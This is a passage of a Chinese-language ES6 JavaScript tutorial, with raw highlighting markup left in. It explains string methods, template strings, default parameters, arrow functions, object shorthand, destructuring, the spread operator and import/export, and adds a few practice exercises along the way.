jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.includes：判断是否包含然后直接返回布尔值</span></span><br><span class="line"><span class="keyword">const</span> str = <span class="string">&#x27;hahay&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">includes</span>(<span class="string">&#x27;y&#x27;</span>)) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.repeat: 获取字符串重复n次</span></span><br><span class="line"><span class="keyword">const</span> str = <span class="string">&#x27;he&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">repeat</span>(<span class="number">3</span>)) <span class="comment">// &#x27;hehehe&#x27;</span></span><br><span class="line"><span class="comment">//如果你带入小数, Math.floor(num) 来处理</span></span><br><span class="line"><span class="comment">// s.repeat(3.1) 或者 s.repeat(3.9) 都当做成 s.repeat(3) 来处理</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. startsWith 和 endsWith 判断是否以 给定文本 开始或者结束</span></span><br><span class="line"><span class="keyword">const</span> str =  <span class="string">&#x27;hello world!&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">startsWith</span>(<span class="string">&#x27;hello&#x27;</span>)) <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">endsWith</span>(<span class="string">&#x27;!&#x27;</span>)) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. padStart 和 padEnd 填充字符串，应用场景：时分秒</span></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>()</span><br><span class="line">    <span class="keyword">const</span> hours = now.<span class="title function_">getHours</span>().<span class="title function_">toString</span>()</span><br><span class="line">    <span class="keyword">const</span> minutes = now.<span class="title function_">getMinutes</span>().<span class="title function_">toString</span>()</span><br><span class="line">    <span class="keyword">const</span> seconds = now.<span class="title function_">getSeconds</span>().<span class="title function_">toString</span>()</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;hours.padStart(<span class="number">2</span>, <span class="number">0</span>)&#125;</span>:<span class="subst">$&#123;minutes.padStart(<span class="number">2</span>, <span class="number">0</span>)&#125;</span>:<span class="subst">$&#123;seconds.padStart(<span class="number">2</span>, <span class="number">0</span>)&#125;</span>`</span>)</span><br><span class="line">&#125;, <span class="number">1000</span>)</span><br></pre></td></tr></table></figure><p>关于模板字符串现在比较常出现的面试题有两道。同学们不妨写试试看？</p><p>模拟一个模板字符串的实现。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> address = <span class="string">&#x27;北京海淀区&#x27;</span></span><br><span class="line"> <span class="keyword">let</span> name = <span class="string">&#x27;lala&#x27;</span></span><br><span class="line"> <span class="keyword">let</span> str = <span class="string">&#x27;$&#123;name&#125;在$&#123;address&#125;上班...&#x27;</span></span><br><span class="line"> <span class="comment">// 模拟一个方法 myTemplate(str) 最终输出 &#x27;lala在北京海淀区上班...&#x27;</span></span><br><span class="line"> <span class="keyword">function</span> <span class="title function_">myTemplate</span>(<span class="params">str</span>) &#123;</span><br><span class="line">     <span class="comment">// try it</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">myTemplate</span>(str)) <span class="comment">// lala在北京海淀区上班...</span></span><br></pre></td></tr></table></figure><p>实现标签化模板(自定义模板规则)。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="string">&#x27;cc&#x27;</span></span><br><span class="line">  <span class="keyword">const</span> gender = <span class="string">&#x27;male&#x27;</span></span><br><span class="line">  <span class="keyword">const</span> hobby = <span class="string">&#x27;basketball&#x27;</span></span><br><span class="line">  <span class="comment">// 实现tag最终输出 &#x27;姓名：**cc**，性别：**male**，爱好：**basketball**&#x27;</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">tag</span>(<span class="params">strings</span>) &#123;</span><br><span class="line">      <span class="comment">// do it</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> str = tag<span class="string">`姓名：<span class="subst">$&#123;name&#125;</span>，性别：<span class="subst">$&#123;gender&#125;</span>，爱好：<span class="subst">$&#123;hobby&#125;</span>`</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(str) <span class="comment">// &#x27;姓名：**cc**，性别：**male**，爱好：**basketball**&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="3-函数"><a href="#3-函数" class="headerlink" title="3.函数"></a>3.函数</h3><h4 id="函数默认参数"><a href="#函数默认参数" class="headerlink" title="函数默认参数"></a>函数默认参数</h4><p>在ES5我们给函数定义参数默认值是怎么样？</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function action(<span class="built_in">num</span>) &#123;</span><br><span class="line">        <span class="built_in">num</span> = <span class="built_in">num</span> || <span class="number">200</span></span><br><span class="line">        <span class="comment">//当传入num时，num为传入的值</span></span><br><span class="line">        <span class="comment">//当没传入参数时，num即有了默认值200</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">num</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但细心观察的同学们肯定会发现，num传入为0的时候就是false，但是我们实际的需求就是要拿到num &#x3D; 0，此时num &#x3D; 200 明显与我们的实际想要的效果明显不一样.</p><p>ES6为参数提供了默认值。在定义函数时便初始化了这个参数，以便在参数没有被传递进去时使用。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">action</span>(<span class="params">num = <span class="number">200</span></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(num)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">action</span>(<span class="number">0</span>) <span class="comment">// 0</span></span><br><span class="line">  <span class="title function_">action</span>() <span class="comment">//200</span></span><br><span class="line">  <span class="title function_">action</span>(<span class="number">300</span>) <span class="comment">//300</span></span><br></pre></td></tr></table></figure><h4 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h4><p>ES6很有意思的一部分就是函数的快捷写法。也就是箭头函数。</p><p>箭头函数最直观的三个特点:</p><blockquote><p>不需要 function 关键字来创建函数<br>省略 return 关键字<br>继承当前上下文的 this 关键字</p></blockquote><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//例如：</span></span><br><span class="line">    [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].<span class="title function_">map</span>(<span class="function"><span class="params">x</span> =&gt;</span> x + <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">//等同于：</span></span><br><span class="line">    [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].<span class="title function_">map</span>((<span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> x + <span class="number">1</span></span><br><span class="line">    &#125;).<span class="title function_">bind</span>(<span class="variable language_">this</span>))</span><br></pre></td></tr></table></figure><h5 id="说个小细节"><a href="#说个小细节" class="headerlink" title="说个小细节:"></a>说个小细节:</h5><p>&#x3D;&#x3D;当你的函数有且仅有一个参数的时候，是可以省略掉括号的&#x3D;&#x3D;。当你函数返回有且仅有一个表达式的时候可以省略{} 和 return；例如:</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当你的函数有且仅有一个参数的时候，是可以省略掉括号的。当你函数返回有且仅有一个表达式的时候可以省略&#123;&#125; 和 <span class="keyword">return</span>；例如:</span><br></pre></td></tr></table></figure><p>作为参考:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title function_">people</span> = (<span class="params">name, age</span>) =&gt; &#123;</span><br><span class="line">       <span class="keyword">const</span> fullName = <span class="string">&#x27;hello&#x27;</span> + name</span><br><span class="line">       <span class="keyword">return</span> fullName</span><br><span class="line">   &#125; </span><br><span class="line">   <span class="comment">//如果缺少()或者&#123;&#125;就会报错</span></span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 请使用ES6重构以下代码</span></span><br><span class="line"> <span class="keyword">var</span> calculate = <span class="keyword">function</span>(<span class="params">x, y, z</span>) &#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">typeof</span> x != <span class="string">&#x27;number&#x27;</span>) &#123; x = <span class="number">0</span> &#125;</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">typeof</span> y != <span class="string">&#x27;number&#x27;</span>) &#123; y = <span class="number">6</span> &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> dwt = x % y</span><br><span class="line">   <span class="keyword">var</span> result</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (dwt == z) &#123; result = <span class="literal">true</span> &#125;</span><br><span class="line">   <span class="keyword">if</span> (dwt != z) &#123; result = <span class="literal">false</span> &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span> result</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">calculate</span> = (<span class="params">x, y, z</span>) =&gt; &#123;</span><br><span class="line">   x = <span class="keyword">typeof</span> x !== <span class="string">&#x27;number&#x27;</span> ? <span class="number">0</span> : x</span><br><span class="line">   y = <span class="keyword">typeof</span> y !== <span class="string">&#x27;number&#x27;</span> ? <span class="number">6</span> : y</span><br><span class="line">   <span class="keyword">return</span> x % y === z</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="4-拓展的对象功能"><a href="#4-拓展的对象功能" class="headerlink" title="4.拓展的对象功能"></a>4.拓展的对象功能</h3><p>4.拓展的对象功能</p><p>ES5我们对于对象都是以键值对的形式书写，是有可能出现键值对重名的。例如：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">people</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">name</span>: name,</span><br><span class="line">        <span class="attr">age</span>: age</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>键值对重名，ES6可以简写如下：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">people</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        name,</span><br><span class="line">        age</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ES6 同样改进了为对象字面量方法赋值的语法。ES5为对象添加方法：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> people = &#123;</span><br><span class="line">     <span class="attr">name</span>: <span class="string">&#x27;lux&#x27;</span>,</span><br><span class="line">     <span class="attr">getName</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">         <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>ES6通过省略冒号与 function 关键字，将这个语法变得更简洁</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> people = &#123;</span><br><span class="line">     <span class="attr">name</span>: <span class="string">&#x27;lux&#x27;</span>,</span><br><span class="line">     getName () &#123;</span><br><span class="line">         <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><code>ES6</code>对象提供了<code>Object.assign()</code>这个方法来实现浅复制。<br> <code>Object.assign()</code> 可以把任意多个源对象自身可枚举的属性拷贝给目标对象，然后返回目标对象。第一参数即为目标对象。在实际项目中，我们为了不改变源对象。一般会把目标对象传为{}</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> objA = &#123; <span class="attr">name</span>: <span class="string">&#x27;cc&#x27;</span>, <span class="attr">age</span>: <span class="number">18</span> &#125;</span><br><span class="line">   <span class="keyword">const</span> objB = &#123; <span class="attr">address</span>: <span class="string">&#x27;beijing&#x27;</span> &#125;</span><br><span class="line">   <span class="keyword">const</span> objC = &#123;&#125; <span class="comment">// 这个为目标对象</span></span><br><span class="line">   <span class="keyword">const</span> obj = <span class="title class_">Object</span>.<span class="title function_">assign</span>(objC, objA, objB)</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 我们将 objA objB objC obj 分别输出看看</span></span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(objA)   <span class="comment">// &#123; name: &#x27;cc&#x27;, age: 18 &#125;</span></span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(objB) <span class="comment">// &#123; address: &#x27;beijing&#x27; &#125;</span></span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(objC) <span class="comment">// &#123; name: &#x27;cc&#x27;, age: 18, address: &#x27;beijing&#x27; &#125;</span></span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(obj) <span class="comment">// &#123; name: &#x27;cc&#x27;, age: 18, address: &#x27;beijing&#x27; &#125;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// 是的，目标对象ObjC的值被改变了。</span></span><br><span class="line">   <span class="comment">// so，如果objC也是你的一个源对象的话。请在objC前面填在一个目标对象&#123;&#125;</span></span><br><span class="line">   <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, objC, objA, objB)</span><br></pre></td></tr></table></figure><h3 id="5-更方便的数据访问–解构"><a href="#5-更方便的数据访问–解构" class="headerlink" title="5.更方便的数据访问–解构"></a>5.更方便的数据访问–解构</h3><p>数组和对象是JS中最常用也是最重要表示形式。为了简化提取信息，ES6新增了解构，这是将一个数据结构分解为更小的部分的过程</p><p>ES5我们提取对象中的信息形式如下：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> people = &#123;</span><br><span class="line">     <span class="attr">name</span>: <span class="string">&#x27;lux&#x27;</span>,</span><br><span class="line">     <span class="attr">age</span>: <span class="number">20</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">const</span> name = people.<span class="property">name</span></span><br><span class="line"> <span class="keyword">const</span> age = people.<span class="property">age</span></span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(name + <span class="string">&#x27; --- &#x27;</span> + age)</span><br></pre></td></tr></table></figure><p>是不是觉得很熟悉，没错，在ES6之前我们就是这样获取对象信息的，一个一个获取。现在，解构能让我们从对象或者数组里取出数据存为变量，例如</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对象</span></span><br><span class="line">  <span class="keyword">const</span> people = &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;lux&#x27;</span>,</span><br><span class="line">      <span class="attr">age</span>: <span class="number">20</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> &#123; name, age &#125; = people</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;name&#125;</span> --- <span class="subst">$&#123;age&#125;</span>`</span>)</span><br><span class="line">  <span class="comment">//数组</span></span><br><span class="line">  <span class="keyword">const</span> color = [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;blue&#x27;</span>]</span><br><span class="line">  <span class="keyword">const</span> [first, second] = color</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(first) <span class="comment">//&#x27;red&#x27;</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(second) <span class="comment">//&#x27;blue&#x27;</span></span><br></pre></td></tr></table></figure><p>要不来点儿面试题，看看自己的掌握情况？</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 请使用 ES6 重构一下代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一题</span></span><br><span class="line"><span class="keyword">var</span> jsonParse = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="property">jsonParse</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二题</span></span><br><span class="line"><span class="keyword">var</span> body = request.<span class="property">body</span></span><br><span class="line"><span class="keyword">var</span> username = body.<span class="property">username</span></span><br><span class="line"><span class="keyword">var</span> password = body.<span class="property">password</span></span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.</span></span><br><span class="line">  <span class="keyword">import</span> &#123; jsonParse &#125; <span class="keyword">from</span> <span class="string">&#x27;body-parser&#x27;</span></span><br><span class="line">  <span class="comment">// 2. </span></span><br><span class="line">  <span class="keyword">const</span> &#123; body, <span class="attr">body</span>: &#123; username, password &#125; &#125; = request</span><br></pre></td></tr></table></figure><h3 id="6-Spread-Operator-展开运算符"><a href="#6-Spread-Operator-展开运算符" class="headerlink" title="6.Spread Operator 展开运算符"></a>6.Spread Operator 展开运算符</h3><p>ES6中另外一个好玩的特性就是Spread Operator 也是三个点儿…接下来就展示一下它的用途。</p><p>组装对象或者数组</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">//数组</span></span><br><span class="line">    <span class="keyword">const</span> color = [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;yellow&#x27;</span>]</span><br><span class="line">    <span class="keyword">const</span> colorful = [...color, <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;pink&#x27;</span>]</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(colorful) <span class="comment">//[red, yellow, green, pink]</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//对象</span></span><br><span class="line">    <span class="keyword">const</span> alp = &#123; <span class="attr">fist</span>: <span class="string">&#x27;a&#x27;</span>, <span class="attr">second</span>: <span class="string">&#x27;b&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">const</span> alphabets = &#123; ...alp, <span class="attr">third</span>: <span class="string">&#x27;c&#x27;</span> &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(alphabets) <span class="comment">//&#123; &quot;fist&quot;: &quot;a&quot;, &quot;second&quot;: &quot;b&quot;, &quot;third&quot;: &quot;c&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有时候我们想获取数组或者对象除了前几项或者除了某几项的其他项</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数组</span></span><br><span class="line">    <span class="keyword">const</span> <span class="built_in">number</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">    <span class="keyword">const</span> [first, ...rest] = <span class="built_in">number</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(rest) <span class="comment">//2,3,4,5</span></span><br><span class="line">    <span class="comment">//对象</span></span><br><span class="line">    <span class="keyword">const</span> user = &#123;</span><br><span class="line">        <span class="attr">username</span>: <span class="string">&#x27;lux&#x27;</span>,</span><br><span class="line">        <span class="attr">gender</span>: <span class="string">&#x27;female&#x27;</span>,</span><br><span class="line">        <span class="attr">age</span>: <span class="number">19</span>,</span><br><span class="line">        <span class="attr">address</span>: <span class="string">&#x27;peking&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> &#123; username, ...rest &#125; = user</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(rest) <span class="comment">//&#123;&quot;address&quot;: &quot;peking&quot;, &quot;age&quot;: 19, &quot;gender&quot;: &quot;female&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于 Object 而言，还可以用于组合成新的 Object 。(ES2017 stage-2 proposal) 当然如果有重复的属性名，右边覆盖左边</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> first = &#123;</span><br><span class="line">      a: <span class="number">1</span>,</span><br><span class="line">      b: <span class="number">2</span>,</span><br><span class="line">      c: <span class="number">6</span>,</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">const</span> second = &#123;</span><br><span class="line">      c: <span class="number">3</span>,</span><br><span class="line">      d: <span class="number">4</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">const</span> total = &#123; ...first, ...second &#125;</span><br><span class="line">  console.<span class="built_in">log</span>(total) <span class="comment">// &#123; a: 1, b: 2, c: 3, d: 4 &#125;</span></span><br></pre></td></tr></table></figure><h3 id="7-import-和-export"><a href="#7-import-和-export" class="headerlink" title="7.import 和 export"></a>7.import 和 export</h3><p>import导入模块、export导出模块</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//全部导入</span></span><br><span class="line"><span class="keyword">import</span> people <span class="keyword">from</span> <span class="string">&#x27;./example&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//有一种特殊情况，即允许你将整个模块当作单一对象进行导入</span></span><br><span class="line"><span class="comment">//该模块的所有导出都会作为对象的属性存在</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> example <span class="keyword">from</span> <span class="string">&quot;./example.js&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(example.<span class="property">name</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(example.<span class="property">age</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(example.<span class="title function_">getName</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment">//导入部分</span></span><br><span class="line"><span class="keyword">import</span> &#123;name, age&#125; <span class="keyword">from</span> <span class="string">&#x27;./example&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 导出默认, 有且只有一个默认</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 部分导出</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">App</span> extend <span class="title class_">Component</span> &#123;&#125;;</span><br></pre></td></tr></table></figure><p>以前有人问我，导入的时候有没有大括号的区别是什么。下面是我在工作中的&#x3D;&#x3D;总结&#x3D;&#x3D;：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>当用<span class="keyword">export</span> <span class="keyword">default</span> people导出时，就用 <span class="keyword">import</span> people 导入（不带大括号）</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>一个文件里，有且只能有一个<span class="keyword">export</span> <span class="keyword">default</span>。但可以有多个<span class="keyword">export</span>。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>当用<span class="keyword">export</span> name 时，就用<span class="keyword">import</span> &#123; name &#125;导入（记得带上大括号）</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>当一个文件里，既有一个<span class="keyword">export</span> <span class="keyword">default</span> people, 又有多个<span class="keyword">export</span> name 或者 <span class="keyword">export</span> age时，导入就用 <span class="keyword">import</span> people, &#123; name, age &#125; </span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>当一个文件里出现n多个 <span class="keyword">export</span> 导出很多模块，导入时除了一个一个导入，也可以用<span class="keyword">import</span> * <span class="keyword">as</span> example</span><br></pre></td></tr></table></figure><h3 id="8-Promise"><a href="#8-Promise" class="headerlink" title="8. Promise"></a>8. Promise</h3><blockquote><p>在promise之前代码过多的回调或者嵌套，可读性差、耦合度高、扩展性低。通过Promise机制，扁平化的代码机构，大大提高了代码可读性；用同步编程的方式来编写异步代码，保存线性的代码逻辑，极大的降低了代码耦合性而提高了程序的可扩展性。</p></blockquote><p>说白了就是用同步的方式去写异步代码。</p><p>发起异步请求</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 